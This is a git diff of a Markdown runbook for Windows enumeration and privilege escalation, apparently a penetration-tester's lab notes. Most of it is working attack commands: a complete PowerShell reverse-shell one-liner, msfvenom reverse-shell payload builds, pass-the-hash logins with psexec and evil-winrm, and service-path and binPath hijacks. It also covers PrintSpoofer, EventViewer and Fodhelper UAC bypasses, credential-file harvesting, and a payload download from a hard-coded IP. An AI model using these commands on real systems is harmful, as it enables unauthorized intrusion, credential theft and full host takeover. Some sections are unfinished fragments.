@@ -1,21 +1,21 @@
 # Windows Enumeration and Privilege Escalation
-<!--- Status 80% --->
+<!--- Status 75% --->
 
 ## Introduction
-Updatw
-This runbook is to help with information gathering.  It is set up to all be active gathering as all of the techniques interact with the given hosts.  Passive information gathering should be one prior as well.
 
-## Table of Content
+This runbook is to help with Windows Enumeration and Privilege Escalation.  It includes a variety of techniques and tools to do so using command line or powershell.  The runbook concludes with a finalize portion that can help either keep persistance or to sanitize the host if desired.  This runbook should be utilized before the Active Directory enumeration, but many of the information gathered here will also be helpful during that phase.
+
+## Table of Contents
 
 - [Windows Enumeration and Privilege Escalation](#windows-enumeration-and-privilege-escalation)
   - [Introduction](#introduction)
-  - [Table of Content](#table-of-content)
+  - [Table of Contents](#table-of-contents)
   - [Stabilize](#stabilize)
     - [Useful reverse shells](#useful-reverse-shells)
   - [Install needed tools](#install-needed-tools)
   - [Enumeration](#enumeration)
     - [System Info](#system-info)
-    - [Users/Groups](#usersgroups)
+    - [Users \& Groups](#users--groups)
     - [Permissions](#permissions)
     - [Networking](#networking)
     - [Logs \& History](#logs--history)
@@ -46,29 +46,37 @@ This runbook is to help with information gathering.  It is set up to all be acti
 rlwrap nc -lvnp 443
 ```
 ### Useful reverse shells
+
 - Powershell oneliner:
 
 ```cmd
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
-- Base64 encoded powershell oneliner:
-```bash
 
+- Base64 encoded powershell oneliner:
+
+```bash
 wget https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
 python3 mkpsrevshell.py <ip> 443
 ```
+
 - TCP reverse shell executable:
+
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
 ```
+
 - Via SMB:
+
 ```bash
 psexec.py '<username>:<password>@<ip>'
 wmiexec.py '<username>:<password>@<ip>'
 winexe -U '<username>%<password>' //<ip> cmd.exe
 pth-winexe -U '<username>%<lm_hash>:<nt_hash>' //<ip> cmd.exe
 ```
+
 - Via WinRM:
+
 ```bash
 evil-winrm -i <ip> -u <username> -p <password>
 evil-winrm -i <ip> -u <username> -H <nt_hash>
@@ -93,7 +101,9 @@ evil-winrm -i <ip> -u <username> -H <nt_hash>
 - ipconfig /all
 ```
 
-### Users/Groups
+- see 
+
+### Users & Groups
 
 - Users
 
@@ -134,6 +144,12 @@ evil-winrm -i <ip> -u <username> -H <nt_hash>
 - Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 - Get-ChildItem -Path C:\<app> -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 - Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue 
+```
+
+- Mounts and shares
+  
+```cmd
+dir 
 ```
 
 - ### Processes & Services
@@ -185,7 +201,9 @@ C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHos
 ```powershell
 Get-ChildItem -Path Env:
 ```
-  
+
+<!-- Maybe some logs -->
+
 ### Installed software
 
 - View installed software
@@ -210,6 +228,7 @@ dir "C:/Program Files"
 
 ## Automated Tools
 
+<!--The followinig needs rework -->
  evil-winrm
 
 ### WinPEASx64.exe
@@ -222,9 +241,6 @@ dir "C:/Program Files"
  Anything that winpeas highlights as an escalation factor?
  Is there e.g. a web server running as root, or MySQL/MSSQL?
 
-
-
-
 ### AD Checklist - Run this if you have valid AD creds
 
 * Any users kerberoastable?
@@ -233,10 +249,10 @@ dir "C:/Program Files"
 * GMSAReadPassword?
 * LAPS? https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps
 
-
 ## Privilege Escalation
 
 ### Unquoted Service Path
+
 -> Detection 
 ```
 wmic service get Name,State,PathName | findstr "Program"  
@@ -266,6 +282,7 @@ shutdown /r
 ```
 
 ### binPath - Services [PrivEsc]
+
 -> Detection
 ```
 . .\PowerUp.ps1
@@ -296,12 +313,14 @@ sc start <service_name>
 https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite  
 
 ### SeImpersonatePrivilege
+
 ```
 PrintSpoofer64.exe -i -c cmd
 ```
 https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 
 ### Autorun
+
 -> Detection - windows
 ```
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu ""C:\Program Files\Autorun Program"  
@@ -318,6 +337,7 @@ logoff
 ```
 
 ### Startup Applications
+
 -> Detection - Windows
 ```
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | findstr (F) 
@@ -337,9 +357,12 @@ logoff
 ```
 
 ### Bypass UAC
+
 After obtaining a reverse shell on a machine with a local administrator user, it may be necessary to bypass User Account Control (UAC) to perform specific malicious actions, such as persistently installing malware, modifying security settings, or exploiting system vulnerabilities. This can be done through specialized techniques and tools designed to bypass the restrictions imposed by UAC.
 https://decoder.cloud/2017/02/03/bypassing-uac-from-a-remote-powershell-and-escalting-to-system/
+
 #### EventViewer
+
 -> Step 1 - Kali
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f exe > ok.exe
@@ -376,9 +399,11 @@ Invoke-EventViewer C:\Windows\tasks\shell2.exe
 https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1
 
 #### FodhelperBypass
+
 https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1
 
 ### Capturing configuration file credentials
+
 -> Powershell History  
 ```
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -424,6 +449,7 @@ python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
 https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py
 
 ## Windows Enumeration Tools
+
 -> PowerUp.ps1  
 ```
 . .\PowerUp.ps1
@@ -459,3 +485,5 @@ iwr -uri http://192.168.45.215/JuicyPotatoNG.exe -outfile JuicyPotatoNG.exe
 ## Establish tunnel
 
 ## Establish persistance
+
+ <!--- Last Updated July 9, 2024 --->
